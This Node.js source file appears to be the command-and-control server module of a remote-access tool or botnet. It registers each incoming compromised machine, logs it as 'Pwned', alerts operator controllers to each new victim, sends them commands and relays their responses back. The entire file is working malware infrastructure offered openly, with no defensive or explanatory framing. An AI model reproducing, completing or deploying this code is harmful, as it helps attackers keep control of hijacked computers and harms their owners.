const { Socket } = require('net');
const { PacketConnection } = require('../protocol/connection');
const { packet_types } = require('../protocol/protocol');
const { createPacket } = require('../protocol/packet');
const { parsePacket, serializePacket } = require('../protocol/packet');
const { controllers } = require('./control');

const hosts = [];

class Host {
    /**
     * @param {Socket} socket
     */
    constructor(socket) {
        this.connection = new PacketConnection(socket);
        this.connection.on('packet', this.handleResponse);
    }

    handleResponse(packet) {
        let type = null;
        for (let pkt of packet_types.control.response.values()) {
            if (pkt.name == 'hostresponse') {
                type = pkt;
                break;
            }
        }
        let wrappedPkt = {
            type,
            data: packet,
        };
        controllers[0].sendResponse(wrappedPkt);
    }

    sendCommand(command) {
        this.connection.write(command);
    }
}

/**
 * @param {Socket} socket
 */
function handleIncomingHost(socket) {
    let host = new Host(socket);
    let index = hosts.push(host) - 1;
    socket.on('close', () => {
        console.log(`- Host ${index} disconnected`);
        hosts.splice(index, 1);
    });
    socket.on('error', () => {
        console.log(`! Host ${index} forcibly exited`);
    });
    console.log(`+ Pwned ${socket.remoteAddress} ;)`);
    let packet = createPacket('control', 'response', 'newpwn');
    packet.ip = socket.remoteAddress;
    for (let c of controllers) {
        c.sendResponse(packet);
    }
}

exports.hosts = hosts;
exports.handleIncomingHost = handleIncomingHost;
